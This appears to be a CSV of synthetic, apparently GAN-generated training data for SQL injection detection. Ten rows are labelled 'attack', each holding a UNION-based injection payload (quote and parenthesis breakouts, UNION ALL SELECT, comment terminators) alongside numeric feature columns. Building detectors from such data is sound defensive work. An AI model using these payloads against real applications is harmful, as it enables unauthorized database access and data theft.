id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.810154488033281,72.49627685546875,33.434288024902344,18.697154998779297,14.155695915222168,0.5472647547721863,27.473867416381836,9.81064510345459,1.0248900651931763,0.35563430190086365,0.35286954045295715,0.17038032412528992,0.15250106155872345,3.3834166526794434,0.38040152192115784,0.4163358807563782,2.1000001430511475,0.49301743507385254,0.4604230523109436,0.18667876720428467,-0.14747445285320282,0.9419522881507874,5.29270076751709,0.8585262894630432,0.16923098266124725,0.11507988721132278,0.10464740544557571,0.3106210231781006,-0.05178533121943474,0.28005915880203247,0.4804924428462982,-0.06057646498084068,-0.4030952453613281,-0.4232200086116791,0.9732162356376648,0.3613593578338623,0.11449453234672546,-0.07132979482412338,1.227009892463684,0.15317219495773315,0.2692944407463074,0.06774573028087616,-0.15572905540466309,-0.2758620083332062,-0.3125516474246979,-0.3205251395702362,0.5743903517723083,1.0419738292694092,-0.058226630091667175,0.19821958243846893,0.11731599271297455,-0.21057161688804626,-0.14718136191368103,0.277442067861557,0.6902710795402527,-0.05487123131752014,0.26951736211776733,-0.2490314394235611,-0.08495017141103745,-0.10702692717313766,0.791254460811615,-0.1027299016714096,0.5241960883140564,0.32519444823265076,0.20748576521873474,-0.2385241687297821,-0.3650151491165161,-0.22028103470802307,0.31263506412506104,-0.6416551470756531,-0.30514368414878845,0.15555980801582336,-0.23465664684772491,0.8530867695808411,-0.13622845709323883,0.18895192444324493,0.03363814949989319,-0.10802865028381348,-0.3887243866920471,-0.2472180873155594,-0.5290440320968628,1.0947763919830322,-0.012687725014984608,0.953462541103363,-0.22490398585796356,0.13589580357074738,-0.5990304946899414,0.41546112298965454,-0.24786633253097534
GAN_000002,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,3.892634202119503,71.4716796875,22.70952033996582,27.78304100036621,16.740938186645508,0.13684257864952087,17.36852264404297,10.260958671569824,0.9259558320045471,0.25878632068634033,0.3995516896247864,0.1663859486579895,0.15229840576648712,3.6122729778289795,0.40506255626678467,0.40457794070243835,2.1812827587127686,0.5768660306930542,0.4162493646144867,0.11492637544870377,-0.1177251860499382,0.9709010720252991,4.968360424041748,0.50905841588974,0.18295423686504364,-0.17712107300758362,0.08520633727312088,0.2882460057735443,0.04041890799999237,0.26307380199432373,0.34266746044158936,-0.018888024613261223,-0.36358368396759033,-0.39741092920303345,1.063584566116333,0.3096078336238861,0.13468261063098907,0.012302246876060963,1.2013709545135498,0.7118562459945679,0.22082847356796265,-0.04682548716664314,-0.08797480911016464,-0.4118964672088623,0.23394379019737244,-0.1395336538553238,0.11865738034248352,0.7601608633995056,-0.34906089305877686,0.42287003993988037,0.04335615038871765,-0.2254900336265564,0.06218025088310242,0.3476884365081787,0.4881209135055542,-0.19073964655399323,0.35477614402770996,-0.37980422377586365,-0.04529988020658493,0.09935913234949112,0.946012020111084,0.0021096616983413696,0.32619786262512207,0.05538131296634674,0.6043035984039307,-0.13417257368564606,-0.31657567620277405,-0.4236041307449341,0.0488862544298172,-0.3051484227180481,-0.0863959789276123,0.18136675655841827,-0.39434823393821716,0.4407199025154114,0.026645082980394363,0.20086988806724548,0.046528466045856476,-0.10015738010406494,-0.42544281482696533,-0.2466420978307724,-0.19267643988132477,1.5157641172409058,0.0485844649374485,1.1154990196228027,-0.43676161766052246,-0.02255423739552498,-0.0759100466966629,0.5121204257011414,0.21815210580825806
GAN_000003,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,5.270577970232232,72.54155731201172,23.030479431152344,35.3387336730957,16.969297409057617,-0.7022700905799866,14.044902801513672,11.24232006072998,0.7841612100601196,0.19167718291282654,0.505555272102356,0.11261282116174698,0.16178390383720398,3.525686740875244,0.7489899396896362,0.5915354490280151,1.7133525609970093,0.6346044540405273,0.21525757014751434,0.06735672056674957,-0.12045063823461533,0.6253038048744202,6.108509063720703,0.8490051031112671,-0.15398018062114716,-0.6478255987167358,0.04225921630859375,0.4224582314491272,-0.04874813184142113,0.33867335319519043,0.06724832952022552,0.4787626564502716,-1.0986380577087402,-0.3983878791332245,1.0972908735275269,0.5291010737419128,-0.0029839149210602045,0.0036070842761546373,1.2041205167770386,0.5360552072525024,0.1749347597360611,-0.2772827446460724,-0.06137558072805405,-0.5891135931015015,-0.10259229689836502,-0.4644702076911926,0.27212056517601013,0.933975338935852,-0.6447206735610962,0.7219868898391724,0.4533733129501343,-0.2720038592815399,0.17742955684661865,0.2559734582901001,0.7629183530807495,0.20587652921676636,0.4035044312477112,-0.23293043673038483,0.20431232452392578,0.5517370700836182,1.4683549404144287,-0.13101421296596527,-0.4556453824043274,0.3223835825920105,1.0762364864349365,-0.07431183755397797,-0.8031280636787415,-0.8836569786071777,0.3142347037792206,-0.3021685481071472,-0.16224077343940735,0.23056194186210632,-0.3213927745819092,0.6746291518211365,-0.19143594801425934,0.14180073142051697,0.0016047366661950946,-0.2860024571418762,-0.37506937980651855,-0.3434543013572693,-0.013925891369581223,0.6501056551933289,-0.07056879252195358,0.9219210743904114,-0.7925904393196106,0.33643293380737305,-0.8172557353973389,0.36698105931282043,0.4668117165565491
GAN_000004,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,6.2252612176549915,73.11808013916016,16.135950088500977,39.61709976196289,15.122119903564453,-0.5699904561042786,0.6948685050010681,11.414726257324219,0.9611979722976685,0.0003741149848792702,0.6735846400260925,0.10805963724851608,0.17995835840702057,3.448410749435425,0.07971442490816116,0.4874858558177948,2.348647356033325,0.8391700983047485,0.40503013134002686,0.001180101651698351,-0.3789554834365845,0.6939994692802429,6.072735786437988,0.676239013671875,-0.28999441862106323,-0.6187076568603516,0.13293811678886414,0.6121090054512024,-0.045152973383665085,0.29986077547073364,0.2996329069137573,0.13492855429649353,-0.9250434041023254,-0.9033181667327881,1.0477927923202515,0.2851131856441498,0.18146832287311554,-0.07036345452070236,1.2349036931991577,0.3919755816459656,0.06678956001996994,-0.25184309482574463,-0.16524380445480347,-0.6250514388084412,0.10894307494163513,-0.1457255780696869,0.318718284368515,1.3407797813415527,-0.5974258780479431,1.1290150880813599,0.2731211185455322,-0.7220907807350159,0.15515585243701935,0.9163302183151245,1.0574300289154053,-0.32654276490211487,0.4674668610095978,-0.5976704955101013,-0.015574932098388672,0.2018277645111084,2.0032458305358887,0.06374650448560715,0.12970075011253357,0.17973965406417847,0.882522463798523,-0.1747179925441742,-0.551358699798584,-0.8974816799163818,-0.2906482219696045,-0.46445542573928833,0.29766973853111267,0.19273939728736877,-0.7460053563117981,0.5549807548522949,-0.040112048387527466,0.07166055589914322,0.05041184648871422,-0.19634655117988586,-0.8260663747787476,-0.11096089333295822,-0.5106298327445984,-0.5273543000221252,-0.014470142312347889,0.8800745606422424,-0.8396620154380798,0.24792717397212982,-0.159513920545578,0.6549636125564575,0.11535482108592987
GAN_000005,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,4.4315750769355535,72.58548736572266,25.66705894470215,26.489288330078125,16.243343353271484,0.002720742719247937,20.393714904785156,10.354402542114258,0.9778040051460266,0.25812646746635437,0.4572804570198059,0.12602560222148895,0.16080869734287262,3.546375036239624,0.5926330089569092,0.42878130078315735,1.9574658870697021,0.6286282539367676,0.29799264669418335,0.08775252103805542,-0.14575381577014923,0.7723069787025452,6.019356727600098,0.7073829174041748,0.07570729404687881,-0.5254436135292053,0.026165302842855453,0.36115819215774536,-0.03383970633149147,0.1748073250055313,0.23748038709163666,0.23389855027198792,-0.891330361366272,-0.29257795214653015,1.0745418071746826,0.33542871475219727,0.06321556866168976,0.0028327975887805223,1.171090006828308,0.5917350053787231,0.20274221897125244,-0.04830396547913551,-0.14222998917102814,-0.33435550332069397,-0.25069475173950195,-0.1876477301120758,0.36698856949806213,0.8746342658996582,-0.26314467191696167,0.42627543210983276,0.31067192554473877,-0.11103204637765884,0.012816254049539566,0.21612803637981415,0.6391438841819763,-0.11290372908115387,0.46462202072143555,-0.49596869945526123,0.17338991165161133,0.20447969436645508,1.1079853773117065,-0.018243171274662018,-0.04544789344072342,0.21411541104316711,0.6395956873893738,-0.2722586393356323,-0.32227954268455505,-0.5328449606895447,0.25657665729522705,-0.41094326972961426,-0.37143152952194214,0.40442535281181335,-0.23832812905311584,0.5739156603813171,-0.13587412238121033,0.13098792731761932,0.01601904071867466,-0.19592700898647308,-0.3648824393749237,-0.3035476803779602,-0.174941748380661,1.2320215702056885,-0.01729441061615944,0.8167704939842224,-0.7584317922592163,0.2576671838760376,-0.41456103324890137,0.4751516878604889,0.22354063391685486
GAN_000006,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,3.737165918574253,71.67758178710938,33.096134185791016,14.23340892791748,15.716277122497559,0.7593532800674438,33.707366943359375,9.26994800567627,0.979665219783783,0.4684390723705292,0.22359490394592285,0.19784612953662872,0.13142840564250946,3.502990484237671,0.771954357624054,0.34121882915496826,2.098038911819458,0.34649473428726196,0.4925059378147125,0.22004452347755432,0.0265844464302063,1.4185214042663574,4.986835479736328,0.5592033863067627,0.4297388792037964,0.3085262179374695,0.02623702958226204,0.23566582798957825,0.023388637229800224,0.299256831407547,0.34868842363357544,-0.04463421180844307,-0.1921962946653366,-0.14156998693943024,1.0208282470703125,0.36529943346977234,0.09804187715053558,-0.0492025725543499,1.2381927967071533,0.539380669593811,0.4404536485671997,0.10757436603307724,-0.10238657146692276,-0.04852644354104996,-0.012997826561331749,-0.20281217992305756,0.1723950356245041,0.5484022498130798,-0.278160959482193,0.028370782732963562,0.15819688141345978,0.18723374605178833,-0.19457615911960602,-0.024803943932056427,0.391884982585907,-0.06398746371269226,0.08836667239665985,-0.11152258515357971,0.03785049542784691,0.008127440698444843,0.34932398796081543,-0.09738169610500336,0.1859235167503357,0.029397323727607727,0.07870636880397797,-0.37072792649269104,-0.18462620675563812,-0.28276798129081726,0.40340161323547363,-0.18816730380058289,-0.27254101634025574,0.00562702352181077,0.1469310075044632,0.5972825884819031,-0.07260879874229431,0.22891134023666382,0.02481095679104328,-0.10720755159854889,-0.04188671335577965,-0.2489730268716812,-0.19146670401096344,2.711785316467285,0.01325658243149519,0.8919143080711365,-0.16063328087329865,0.09059646725654602,-0.38593974709510803,0.40938156843185425,0.18724533915519714
GAN_000007,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.562629748279424,72.20821380615234,33.49944305419922,14.301634788513184,20.661678314208984,0.07055297493934631,36.60226821899414,7.724856853485107,0.3627176880836487,0.47034215927124023,0.109273262321949,0.18387249112129211,0.12158463150262833,3.4842305183410645,0.8353205323219299,0.6218371391296387,2.3978302478790283,0.3224516212940216,1.061911702156067,0.3397252857685089,0.08991877734661102,1.6374708414077759,4.57985782623291,0.9791694283485413,0.6505762934684753,0.38704434037208557,0.09055638313293457,0.20127107203006744,0.08630435168743134,0.43607473373413086,0.3331424295902252,-0.08470969647169113,-0.4661608338356018,-0.10308706760406494,1.011907935142517,0.20744042098522186,0.09113743901252747,-0.04205049201846123,1.201733946800232,0.2509204149246216,0.454970121383667,-0.09263844043016434,-0.3441779911518097,-0.5548371076583862,0.33882462978363037,-0.9127262830734253,0.483489066362381,0.9648329615592957,-0.12832728028297424,0.14960111677646637,0.46132892370224,0.10866406559944153,0.09318891167640686,0.16814024746418,0.6954121589660645,-0.33464643359184265,0.6869017481803894,-0.3757803738117218,0.13597114384174347,0.12262921780347824,0.9560511708259583,-0.5835737586021423,0.9094609618186951,0.5596235394477844,0.4578147530555725,-0.34295493364334106,-0.3846546411514282,-0.38600409030914307,0.7479009032249451,-0.39024919271469116,-0.6128075122833252,0.06905610114336014,0.16899703443050385,1.5459635257720947,-0.395294189453125,0.2974165081977844,0.05504349619150162,-0.19862495362758636,-0.44789406657218933,-0.38176295161247253,-0.6225982904434204,1.9457038640975952,-0.0275246761739254,0.9618048667907715,-0.6076626181602478,-0.31472939252853394,-0.3031017780303955,0.6753770709037781,0.3188655376434326
GAN_000008,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.682022150687939,73.16142272949219,27.363306045532227,26.10479164123535,14.635193824768066,-0.05915674567222595,22.877107620239258,9.523408889770508,1.0448887348175049,0.3048560619354248,0.410272479057312,0.15381047129631042,0.15026266872882843,3.4144363403320312,0.36171749234199524,0.44049271941185,2.301884889602661,0.6001761555671692,0.6972745060920715,0.1640721559524536,-0.25042495131492615,0.7063499689102173,6.096945762634277,0.758459746837616,0.18472124636173248,-0.21969415247440338,0.08279052376747131,0.2834445536136627,-0.04718470200896263,0.21745257079601288,0.2586022913455963,-0.001857031136751175,-0.45119065046310425,-0.3806050419807434,1.0076624155044556,0.2612529993057251,0.08819019049406052,-0.026977116242051125,1.158261775970459,0.4662003517150879,0.17828476428985596,0.007622013799846172,-0.09441201388835907,-0.17063868045806885,-0.2034454494714737,-0.3408561944961548,0.7048946022987366,1.1239771842956543,-0.17975613474845886,0.29032614827156067,0.11316698789596558,-0.27468591928482056,0.027845017611980438,0.14967283606529236,0.8144457340240479,-0.09851840138435364,0.3005309998989105,-0.58944171667099,0.12020964920520782,0.053377415984869,1.0081802606582642,-0.1314438432455063,0.5151674151420593,0.4471887946128845,0.2666093111038208,-0.056003667414188385,-0.40921568870544434,-0.26586127281188965,0.48981377482414246,-0.8162155747413635,-0.44625622034072876,0.19172519445419312,-0.3612571060657501,0.7718484997749329,-0.18960635364055634,0.17467725276947021,0.03584848344326019,-0.1508975625038147,-0.3274820148944855,-0.16269022226333618,-0.31425604224205017,0.8477234244346619,0.011585461907088757,0.6336919069290161,-0.6205377578735352,0.043165337294340134,-0.38880765438079834,0.5084491968154907,-0.023047395050525665
GAN_000009,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000138,4.028790201392545,72.01969909667969,17.38575553894043,34.74490737915039,15.02786636352539,-0.04089120030403137,10.47219467163086,10.996858596801758,0.9217075109481812,0.14523646235466003,0.5341621041297913,0.13809436559677124,0.16648004949092865,3.6584694385528564,0.28609606623649597,0.3710344731807709,2.090878963470459,0.7059116959571838,0.4448687434196472,0.06953001022338867,-0.19517527520656586,0.5830840468406677,5.000017166137695,0.3505086898803711,-0.014667739160358906,-0.543210506439209,0.11183185130357742,0.2598457336425781,0.0399828739464283,0.22314375638961792,0.24373702704906464,0.222306489944458,-0.41601431369781494,-0.48507577180862427,1.049973964691162,0.2961359918117523,0.059589583426713943,-0.027044983580708504,1.2238941192626953,0.9841384887695312,0.08905407041311264,-0.08087486773729324,-0.04178949445486069,-0.2696473002433777,0.031279586255550385,-0.23954521119594574,0.11476297676563263,0.7472123503684998,-0.60560542345047,0.43008020520210266,0.0057380348443984985,-0.444635808467865,0.21958453953266144,0.23062710464000702,0.39492470026016235,-0.1432926505804062,0.4338071346282959,-0.2383422702550888,0.03888491168618202,0.217105433344841,1.1818288564682007,-0.016295596957206726,0.008304283022880554,0.049297600984573364,0.6184461116790771,-0.047385357320308685,-0.4199123978614807,-0.644875168800354,-0.15007701516151428,-0.3315047025680542,0.012768946588039398,0.2166452407836914,-0.7886878848075867,0.1583000272512436,-0.022783882915973663,0.14537890255451202,0.024651596322655678,-0.037743981927633286,-0.4812200367450714,-0.07883641123771667,-0.04752920940518379,1.118514895439148,0.07054294645786285,0.6562345623970032,-0.6924977898597717,0.11716972291469574,0.08479033410549164,0.208675816655159,0.11125411093235016
GAN_000010,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.985990682763328,72.36515045166016,28.424463272094727,22.909381866455078,17.210342407226562,-0.3227579891681671,27.10527229309082,9.365654945373535,0.8001329898834229,0.3134322464466095,0.29979175329208374,0.17951229214668274,0.1245739683508873,3.489487886428833,0.4900665283203125,0.4458276033401489,2.3398444652557373,0.4887126088142395,0.5809890627861023,0.24016547203063965,-0.03859526664018631,1.3873047828674316,4.843416213989258,0.30835631489753723,0.44510653614997864,-0.2291315644979477,0.06581874936819077,0.3406341075897217,0.021312816068530083,0.3831467628479004,0.3890250325202942,-0.06114518269896507,-0.6941764950752258,-0.24269437789916992,1.0388736724853516,0.22206826508045197,0.09709759801626205,0.00653539365157485,1.1274259090423584,0.6676455736160278,0.25184184312820435,-0.016463298350572586,-0.24150674045085907,-0.35885393619537354,0.28533995151519775,-0.35348016023635864,0.24467656016349792,0.891777753829956,-0.353378564119339,0.634810209274292,0.22114859521389008,0.06247109919786453,0.031603649258613586,0.3434641361236572,0.8523203134536743,-0.10027860105037689,0.38704678416252136,-0.3353935480117798,0.1421496868133545,-0.11331916600465775,1.1670178174972534,-0.20004214346408844,0.5154150724411011,0.20810815691947937,0.3895266056060791,-0.4871944189071655,-0.4662266671657562,-0.7542498707771301,0.487039178609848,-0.4472660422325134,-0.4105050265789032,0.2026679962873459,0.10686130821704865,0.5787395238876343,-0.18310190737247467,0.19420428574085236,0.06177666038274765,-0.2326403558254242,-0.2006968855857849,-0.25078797340393066,-0.27327823638916016,1.2699730396270752,-0.006167646963149309,0.9726061820983887,-0.5565303564071655,-0.11799487471580505,-0.3559326231479645,0.8940111994743347,0.39174509048461914
